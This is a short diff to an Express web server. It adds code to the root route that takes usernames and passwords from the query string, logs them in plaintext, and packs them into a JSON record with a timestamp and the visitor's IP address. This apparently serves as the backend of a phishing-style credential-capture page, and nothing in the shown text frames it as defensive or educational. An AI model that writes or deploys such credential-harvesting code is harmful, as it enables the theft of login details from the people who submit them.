@@ -11,6 +11,15 @@ app.use(express.urlencoded({extended: true}))
 app.use(express.static(__dirname + '/public'))
 
 app.get('/', (req, res) => {
+  if(req.query.username) {
+    console.log(req.query.username, req.query.password)
+    let str = JSON.stringify({
+      timestamp: (new Date(Date.now())).toString(),
+      IP: requestIp.getClientIp(req),
+      username: req.query.username,
+      password: req.query.password
+    }) + "\n"
+  }
   res.sendFile('public/index.html', {root: __dirname})
 }) 
 
